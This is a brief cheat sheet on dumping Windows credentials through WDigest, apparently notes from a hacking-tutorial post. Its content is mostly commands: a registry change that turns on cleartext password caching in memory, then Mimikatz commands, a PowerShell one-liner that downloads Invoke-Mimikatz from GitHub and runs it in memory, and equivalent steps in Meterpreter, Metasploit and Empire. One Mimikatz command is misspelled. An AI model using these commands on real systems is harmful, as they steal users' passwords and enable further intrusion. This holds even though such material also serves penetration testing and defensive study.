# Credential dumping

[Original post](https://www.hackingarticles.in/credential-dumping-wdigest/)

## WDigest

Different approaches

### Manual

Enable WDigest in the system. Which will allow the password to be saved in memory that too in clear texts  
```bat
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
gpupdate /force
```
download mimikatz and run the following commands :
```
privilege::debug
sekrusla::wdigest
```

### PowerShell

This can be also done with [this powershell](https://raw.githubusercontent.com/HarmJ0y/Misc-PowerShell/master/Invoke-WdigestDowngrade.ps1)

```powershell
Import-Module .\WdigestDowngrade.ps1
Invoke-WdigestDowngrade
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```
Once the above commands are executed successfully, run the following command to dump the credentials

```IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds```


### PowerShell via Meterpreter
Inside meterpreter
```
reg enumkey -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest
load powershell
powershell_import /root/Desktop/Invoke-WdigestDowngrade.ps1
powershell_execute Invoke-WdigestDowngrade
```
```
load powershell
powershell_import /root/Invoke-Mimikatz.ps1
powershell_execute Invoke-Mimikatz -CredsDump
```

### Metasploit Framework
```
use post/windows/manage/wdigest_caching
set session 1
execute

load kiwi
creds_wdigest
```

### PowerShell Empire
````
usemodule management/wdigest_downgrade*
execute

usemodule credentials/mimikatz/command*
set Command sekurlsa::wdigest
execute
```